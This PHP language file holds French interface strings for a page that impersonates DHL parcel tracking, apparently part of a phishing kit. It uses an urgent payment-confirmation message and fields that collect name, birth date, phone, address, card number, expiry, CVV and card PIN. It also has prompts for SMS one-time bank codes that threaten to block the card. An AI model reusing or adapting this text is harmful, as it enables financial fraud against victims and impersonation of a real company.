<?php

function lang($phrase){
	static $lang = array(

			'Title_page' => '| Bienvenue | ',
			'Min_i1' => 'Alertes (1)',
			'Min_i2' => 'Global',
			'Min_i3' => 'Rechercher',


			'Ming_i1' => 'Piste',
			'Ming_i2' => 'Navire',
			'Ming_i3' => 'Solutions logistiques',
			'Ming_i4' => 'Service client',




			'Text_i1' => 'SUIVI DHL.',
			'Text_i2' => 'Vous trouverez ici des informations sur vos envois.',
			'Text_i3' => 'Suivez vos envois de colis à tout moment de l&apos;expédition à la livraison',

			'Text_b1' => 'Message important!',
			'Text_b2' => 'Pour terminer la livraison dans les plus brefs délais, veuillez confirmer le paiement',
			'Text_b3' => 'en cliquant sur Suivant. La confirmation en ligne doit être effectuée dans les 14 prochains jours, avant son expiration. ',

			'Input_i1' => 'Nom complet',
			'Input_i2' => 'Date de naissance',
			'Input_i3' => 'Numéro de téléphone',
			'Input_i4' => 'Adresse de facturation',
			'Input_i5' => 'Code postal',

			'Input_cc1' => 'Nom sur la carte',
			'Input_cc2' => 'Numéro de carte',
			'Input_cc3' => 'Date d&apos;expiration MM / AA',
			'Input_cc4' => 'Code de sécurité CVV (CVC)',
 			'Input_cc5' => 'Pin de la carte',


			'Btn_n1' => 'Suivant',

			'Footer_title1' => 'POST DHL GROUP',
			'Footer_title2' => 'SUIVEZ-NOUS',
			'Footer_text1' => 'Sensibilisation à la fraude',
			'Footer_text2' => 'Mentions légales',
			'Footer_text3' => 'Conditions d&apos;utilisation',
			'Footer_text4' => 'Avis de confidentialité',
			'Footer_text5' => 'Résolution des litiges',
			'Footer_text6' => 'Accessibilité',
			'Footer_text7' => 'Paramètres des cookies',
			'Footer_text8' => 'À propos de',
			'Footer_rights' => '2020 © DHL International GmbH. Tous les droits sont réservés.',


            'text_succ' => 'Vous avez activé votre processus d&apos;expédition avec succès. Vous recevrez un e-mail de notre part lorsque nous enverrons votre colis.',
			'Sms_text1' => 'Veuillez confirmer le paiement suivant.',
			'Sms_text2' => 'Le mot de passe unique a été envoyé au numéro de téléphone mobile indiqué ci-dessous. Si vous avez besoin de changer votre numéro de mobile, veuillez contacter votre banque ou le modifier via les canaux disponibles (ATM, web)',
			'Sms_text3' => 'Merchant:',
			'Sms_text4' => 'Amount:',
			'Sms_text5' => 'Date:',
			'Sms_text6' => 'code SMS:',
			'Sms_text7' => 'Veuillez saisir le code de vérification reçu par sms:',
			'Sms_error1' => 'Le SMS est erroné ou expiré! Après (3) erreurs de saisie du code reçu par SMS, la transaction en cours est annulée et la carte de crédit bloquée.'


		
	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
